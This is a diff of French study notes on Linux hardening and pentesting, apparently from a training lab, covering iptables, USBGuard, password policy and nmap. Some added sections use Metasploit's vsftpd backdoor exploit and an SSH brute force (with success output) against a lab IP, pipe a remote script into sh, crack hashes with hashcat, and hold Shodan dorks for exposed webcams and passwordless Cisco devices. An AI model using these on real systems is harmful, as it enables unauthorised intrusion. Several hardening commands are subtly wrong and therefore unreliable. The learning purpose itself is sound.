@@ -1,8 +1,11 @@
-blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
 Utiliser passwd pour définir un mdp
 
 nmap cheat sheet : https://www.stationx.net/nmap-cheat-sheet/
 tryhackme.com
+book.hacktricks.xyz
+https://hackmd.io/kHFoiS5HSHKRdV7az960TQ
+
+Sécuriser un linux peut passer par une mise en place de droits 0740 sur /etc/sudoers avec seul l'admin concerné y étant inscrit
 
 +------+
 | nmap |
@@ -47,4 +50,137 @@ https://www.shodan.io/host/42.53.76.31 affiche les infos du serveur derrière l'
 webcamxp 5 country:"FR"
 cisco no pass
 hp laserjet port:"8081"
+
++----------+
+| USBGuard |
++----------+
+Permet de bloquer les ports usb sous linux
+apt install usbguard
+systemctl status usbguard le donne "inactif" après install
+usbguard generate-policy > /etc/usbguard/rules.conf
+systemctl start usbguard
+systemctl enable usbguard
+usbguard list-devices
+usbguard allow-device 5
+usbguard block-device 5
+
++------------+
+| Metasploit |
++------------+
+Dans Kali, ouvrir une console avec msfconsole
+search vsftp
+use exploit/unix/ftp/vsftpd_234_backdoor
+show options
+set RHOSTS 10.20.30.72
+run
+ATTENTION : le $ ou le # n'est pas affiché
+
+use auxiliary/scanner/ssh/sshlogin
+show options
+set pass_file /usr/share/wordlists/metasploit/http_default_pass.txt
+set user_file /usr/share/wordlists/metasploit/http_default_users.txt
+set rhosts 10.20.30.72
+run
+	Starting bruteforce
+	[+] 10.20.30.72:22 - Success: 'user:user' 'uid=1001(user) gid=1001(user) groups=1001(user)
+	[*] Scanned 1 of 1 hosts (100% complete)
+	[*] Auxiliary module execution completed
+ssh user@10.20.30.72
+
++-----------------+
+| Gestion des mdp |
++-----------------+
+passwd [options] [user]
+passwd -m15 -m30 user1 définit une durée minimale de mdp à 15j et maximale à 30j pour user1
++- Vérifier que les mdp dans /etc/passwd et /etc/shadow soient hachés, non en clair
++- Vérifier l’activation de l’authentification par mots de passe "shadow"
+édition du fichier etc/passwd, le 2ème champ doit contenir "x" pour tous les comptes (confirme l’activation de l’authentification par /etc/shadow)
++- si le fichier "shadow" est non utilisé, la commande pwconv convertit le fichier /etc/passwd en /etc/shadow
++- vérification du remplissage du 2ème champ fichier /etc/shadow (sinon des comptes sans mot de passe existent)
++- blocage du changement de mot de passe non "shadow"
++- utilisation de PAM pour forcer la création de mots de passe solides
++- limitation de la durée de vie et autres options des mots de passe et comptes utilisateurs : durée de vie < temps nécessaire au craquage
++- interdiction de connexion directe pour le compte "root local", fichier /etc/securetty vide, seul sera utilisé le changement d'identité par su root
+
+désactivation de l'accès openssh pour le compte root
++- spécification des utilisateurs autorisés à utiliser la commande "su"
+
++---------+
+| sudo -l |
++---------+
++- permet d'afficher les droits d'élévation pour l'user courant
+
++---------+
+| Linpeas |
++---------+
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
++------+
+| Hash |
++------+
+hashcat 7ecc19e1a0be36ba2c6f05d06b5d3058 -m 0 -O /usr/share/wordlists/rockyou.txt
+
++----------+
+| iptables |
++----------+
++- Pour voir les règles des chaînes de la table FILTER, avec le port concerné
+iptables -L -v
+-A précise la table
+-p précise le protocole
+-j précise l'action
+iptables -A INPUT -p tcp -m multiport --dport 22,80,443 -j DROP
+iptables -A OUTPUT -p tcp -m multiport --dport 22,80,443 -j DROP
++- blinder le port NTP (123) qui permet à un attaquant de lister les machines connectées sur le réseau
+iptables -A INPUT -p tcp --dport 123 -j DROP
+iptables -A OUTPUT -p tcp --sport 123 -j DROP
++- Pour créer une chaîne "SSH" qui contient toutes les règles SSH
+iptables -N SSH
+iptables -A INPUT -j SSH
++- Pour vérifier l'action
+nmap -Pn 10.20.30.72
++-  Pour voir les ports filtrés distants
+nmap -sA 10.20.30.72
++- limiter le SSH à une seule IP connue
+iptables -A SSH -p tcp -s 10.20.30.72 -j ACCEPT
++- limiter tous les protocoles à cette IP
+iptables -A SSH -p all -s 10.20.30.72 -j ACCEPT
+Pour loguer les connections entrantes
+iptables -P INPUT DROP
+iptables -A INPUT -j LOG --log-prefix 'connection dropped :'
+Les logs sont dans /var/log/messages
+tail -f /var/log/messages pour voir en temps réel le fichier
++- Limiter le flooding ICMP
+iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j ACCEPT
++- loguer ce qui passe mais surtout pas ce qui a été refusé pour éviter une surcharge des logs en cas de flooding
+iptables -a INPUT -p icmp -m limit --limit 1/s --limit-burst 1 -j LOG --log-prefix 'ICMP 1/s accepté :'
++- générer du flooding icmp
+hping3 -1 --flood 10.20.30.72
++- sauvegarde et restauration iptables
+iptables-save > default-iptables.txt
+iptables-restore < default-iptables.txt
+
++----------------------+
+| Scripts au démarrage |
++----------------------+
+1. On met un script dans /etc/update-motd.d
+2. On peut créer un service puis l'enable
+		On va dans /etc/systemd/system
+		On crée un .service
+		Contenu d'un service :
+	[Unit]
+	Description="info system"
+
+	[Service]
+	Type=simple
+	ExecStart=/home/user/Documents/test1.sh
+
+	[Install]
+	WantedBy=multi-user.target
+		Contenu du script :
+	#!/bin/bash
+
+	echo "-DATE: $(date +'%a %b %d %H:%HM:%S %Z %Y')"
+		Le test1.sh doit avoir les droits d'exécution, chmod 755
+
+
 
